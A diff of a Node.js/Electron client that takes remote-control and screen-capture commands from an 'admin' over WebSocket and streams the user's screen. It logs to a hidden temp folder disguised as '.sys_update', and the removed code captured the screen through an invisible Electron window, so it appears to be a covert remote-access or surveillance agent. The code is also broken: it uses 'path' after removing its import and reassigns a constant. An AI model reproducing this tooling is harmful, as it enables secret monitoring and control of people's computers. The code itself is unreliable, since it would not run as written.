@@ -1,129 +1,12 @@
 const WebSocket = require('ws');
-const { exec, spawn } = require('child_process');
 const fs = require('fs'); 
 const os = require('os');
-const path = require('path');
-const https = require('https');
 const crypto = require('crypto');
 const http = require('http'); 
 
-// --- SCREEN CAPTURE SETUP ---
-let electronProcess = null;
-let localStream = null; // Moved up to be accessible globally
-
-async function getScreenStreamViaElectron() {
-    try {
-        // Check if Electron is available
-        const electronPath = require.resolve('electron');
-        
-        // Create a temporary script for Electron to run
-        const scriptContent = `
-            const { desktopCapturer, BrowserWindow } = require('electron');
-
-            async function getStream() {
-                try {
-                    const sources = await desktopCapturer.getSources({ types: ['screen', 'window'] });
-                    if (sources.length === 0) return null;
-                    
-                    // Prefer the first screen source
-                    const source = sources.find(s => s.name.includes('Screen')) || sources[0];
-                    
-                    const win = new BrowserWindow({ show: false, width: 1, height: 1 });
-                    await win.loadURL('about:blank');
-                    
-                    const stream = await win.webContents.getMediaStreamSource({
-                        audio: false,
-                        video: {
-                            mandatory: {
-                                chromeMediaSource: 'desktop',
-                                chromeMediaSourceId: source.id,
-                                minWidth: 1280,
-                                maxWidth: 1920,
-                                minHeight: 720,
-                                maxHeight: 1080
-                            }
-                        }
-                    });
-                    
-                    win.close();
-                    return stream;
-                } catch (err) {
-                    console.error("[ELECTRON] Error:", err.message);
-                    process.send({ type: 'error', data: err.message });
-                }
-            }
-
-            getStream().then(stream => {
-                if (stream) {
-                    process.send({ type: 'stream', data: stream });
-                } else {
-                    process.send({ type: 'error', data: 'No screen found' });
-                }
-            }).catch(err => {
-                process.send({ type: 'error', data: err.message });
-            });
-        `;
-
-        // Write the script to a temp file
-        const scriptPath = path.join(os.tmpdir(), 'electron_capture_helper.js');
-        fs.writeFileSync(scriptPath, scriptContent);
-
-        // Spawn Electron
-        const electronMainModule = require('electron');
-        const electronExe = electronMainModule.default || electronMainModule;
-        
-        // If electronExe is not a string (path), try to find it
-        let exePath = typeof electronExe === 'string' ? electronExe : 'electron';
-        
-        // Fallback to finding electron in node_modules
-        if (!fs.existsSync(exePath)) {
-             exePath = path.join(__dirname, 'node_modules', '.bin', 'electron.cmd');
-             if (!fs.existsSync(exePath)) {
-                 exePath = 'electron'; // Try global
-             }
-        }
-
-        log(`[ELECTRON] Spawning Electron from: ${exePath}`);
-        electronProcess = spawn(exePath, [scriptPath], {
-            stdio: ['inherit', 'inherit', 'inherit', 'ipc']
-        });
-
-        return new Promise((resolve, reject) => {
-            let timeoutHandled = false;
-            
-            const handleTimeout = () => {
-                if (!timeoutHandled) {
-                    timeoutHandled = true;
-                    electronProcess.kill();
-                    reject("Electron screen capture timed out");
-                }
-            };
-
-            setTimeout(handleTimeout, 15000);
-
-            electronProcess.on('message', (msg) => {
-                if (msg.type === 'stream') {
-                    clearTimeout(timeoutHandle);
-                    resolve(msg.data);
-                } else if (msg.type === 'error') {
-                    clearTimeout(timeoutHandle);
-                    reject(msg.data);
-                }
-            });
-
-            electronProcess.on('exit', (code) => {
-                if (!timeoutHandled && code !== 0) {
-                    reject(`Electron exited with code ${code}`);
-                }
-            });
-            
-            // Store timeout reference
-            window.timeoutHandle = setTimeout(handleTimeout, 15000);
-        });
-    } catch (err) {
-        throw new Error(`Electron not found: ${err.message}`);
-    }
-}
+// --- GLOBALS FROM INDEX.JS ---
+const localStream = global.electronLocalStream;
+const desktopCapturer = global.desktopCapturer;
 
 // --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
@@ -209,27 +92,12 @@ function initConnection() {
  
  if (data.type === 'take_control') takeControl(true);
  else if (data.type === 'release_control') takeControl(false);
- else if (data.type === 'request_join') {
- log(`[JOIN] Request join received from ${data.from}`);
- handleJoinRequest(data.from);
- } else if (data.type === 'start_join') {
- // NEW: Explicitly start the join process when requested by admin
- log(`[JOIN] Starting join initiated by ${data.from}`);
- handleJoinRequest(data.from);
- } else if (data.type === 'offer') {
- log(`[SIG] Received Offer from Admin`);
- handleOffer(data.sdp, data.targetId || myId);
- } else if (data.type === 'answer') {
- log(`[SIG] Received Answer from Admin`);
- handleAnswer(data.sdp);
- } else if (data.type === 'candidate') {
- log(`[SIG] Received Candidate`);
- handleCandidate(data.candidate);
- } else if (data.type === 'screen_data') {
- captureScreenPureJS();
- } else if (data.type === 'system_log') {
- // Optional
- }
+ else if (data.type === 'request_join') handleJoinRequest(data.from);
+ else if (data.type === 'start_join') handleJoinRequest(data.from);
+ else if (data.type === 'offer') handleOffer(data.sdp, data.targetId || myId);
+ else if (data.type === 'answer') handleAnswer(data.sdp);
+ else if (data.type === 'candidate') handleCandidate(data.candidate);
+ else if (data.type === 'screen_data') captureScreenPureJS();
  } catch (e) {
  log(`[WS] Error parsing message: ${e.message}`);
  }
@@ -291,19 +159,23 @@ function startMonitoring() {
 // --- WEBRTC FUNCTIONS ---
 
 async function setupLocalStream() {
+ // Use the stream initialized by index.js
  if (localStream) return localStream;
- try {
- log("[WEBRTC] Requesting screen access via Electron...");
- localStream = await getScreenStreamViaElectron();
- if (!localStream) {
-     throw new Error("Failed to get screen stream");
- }
- log("[WEBRTC] Screen access granted");
  
- localStream.getVideoTracks()[0].onended = () => {
- log("[WEBRTC] User stopped sharing");
- closePeerConnection();
- };
+ // Fallback if index.js failed to capture
+ try {
+ log("[WEBRTC] Requesting screen access via fallback...");
+ localStream = await navigator.mediaDevices.getUserMedia({
+     video: {
+         mandatory: {
+             chromeMediaSource: 'desktop',
+             minWidth: 1280,
+             maxWidth: 1920,
+             minHeight: 720,
+             maxHeight: 1080
+         }
+     }
+ });
  return localStream;
  } catch (err) {
  log(`[WEBRTC] Screen access denied: ${err.message}`);
